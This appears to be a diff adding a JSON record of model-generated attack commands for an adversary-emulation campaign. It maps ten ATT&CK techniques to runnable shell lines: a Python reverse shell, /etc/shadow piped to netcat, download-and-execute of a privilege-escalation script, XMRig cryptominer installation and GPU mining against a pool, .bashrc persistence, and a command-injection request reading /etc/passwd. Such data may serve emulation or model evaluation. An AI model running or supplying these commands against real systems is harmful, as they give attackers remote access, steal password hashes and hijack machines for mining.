@@ -1,0 +1,110 @@
+{
+  "campaign_id": "C0045",
+  "model": "gpt-oss:20b",
+  "sample": 2,
+  "temperature": 0.0,
+  "realizations": [
+    {
+      "technique_id": "T1588.002",
+      "mechanism": "download-tool",
+      "command": "curl -L https://example.com/xmrig.tar.gz -o /tmp/xmrig.tar.gz",
+      "target": "actor.primary",
+      "parameters": {
+        "url": "https://example.com/xmrig.tar.gz",
+        "output_path": "/tmp/xmrig.tar.gz"
+      }
+    },
+    {
+      "technique_id": "T1190",
+      "mechanism": "ray-cve-exploit",
+      "command": "curl -X POST http://192.168.1.10/api/v1/execute?cmd=cat%20/etc/passwd",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "target_url": "http://192.168.1.10/api/v1/execute",
+        "payload": "cat /etc/passwd"
+      }
+    },
+    {
+      "technique_id": "T1059.006",
+      "mechanism": "python-pty-reverse-shell",
+      "command": "python3 -c 'import socket,subprocess,os; s=socket.socket();s.connect((\"192.168.1.10\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'",
+      "target": "target.primary",
+      "parameters": {
+        "attacker_ip": "192.168.1.10",
+        "port": 4444
+      }
+    },
+    {
+      "technique_id": "T1546.004",
+      "mechanism": "add-shell-config",
+      "command": "echo 'export PATH=$PATH:/opt/xmrig' >> /home/user/.bashrc",
+      "target": "target.primary",
+      "parameters": {
+        "config_path": "/home/user/.bashrc",
+        "content": "export PATH=$PATH:/opt/xmrig"
+      }
+    },
+    {
+      "technique_id": "T1068",
+      "mechanism": "download-priv-esc-payload",
+      "command": "curl -L https://example.com/priv_esc.sh -o /tmp/priv_esc.sh && chmod +x /tmp/priv_esc.sh && /tmp/priv_esc.sh",
+      "target": "target.primary",
+      "parameters": {
+        "url": "https://example.com/priv_esc.sh",
+        "script_path": "/tmp/priv_esc.sh"
+      }
+    },
+    {
+      "technique_id": "T1027.013",
+      "mechanism": "decode-base64",
+      "command": "echo 'cHJpbnQgIkhlbGxvIHRoaXMgaXMgZGVjb2RlZCI=' | base64 -d > /tmp/message.txt",
+      "target": "target.primary",
+      "parameters": {
+        "encoded_string": "cHJpbnQgIkhlbGxvIHRoaXMgaXMgZGVjb2RlZCI=",
+        "output_path": "/tmp/message.txt"
+      }
+    },
+    {
+      "technique_id": "T1003.008",
+      "mechanism": "cat-shadow",
+      "command": "cat /etc/shadow | nc 192.168.1.10 4445",
+      "target": "target.primary",
+      "parameters": {
+        "attacker_ip": "192.168.1.10",
+        "port": 4445
+      }
+    },
+    {
+      "technique_id": "T1016",
+      "mechanism": "dns-query",
+      "command": "dig @8.8.8.8 myip.opendns.com +short > /tmp/ip.txt",
+      "target": "target.primary",
+      "parameters": {
+        "resolver": "8.8.8.8",
+        "query_name": "myip.opendns.com",
+        "output_path": "/tmp/ip.txt"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "download-execute-xmrig",
+      "command": "wget https://example.com/xmrig.tar.gz -O /tmp/xmrig.tar.gz && tar xf /tmp/xmrig.tar.gz -C /opt/ && /opt/xmrig/xmrig --config config.json",
+      "target": "target.primary",
+      "parameters": {
+        "url": "https://example.com/xmrig.tar.gz",
+        "download_path": "/tmp/xmrig.tar.gz",
+        "extract_dir": "/opt/"
+      }
+    },
+    {
+      "technique_id": "T1496.001",
+      "mechanism": "gpu-miner-start",
+      "command": "/opt/xmrig/xmrig --cuda -o pool.minexmr.com:4444 -u user.xmrig -p x",
+      "target": "target.primary",
+      "parameters": {
+        "miner_path": "/opt/xmrig/xmrig",
+        "options": "--cuda -o pool.minexmr.com:4444 -u user.xmrig -p x"
+      }
+    }
+  ]
+}
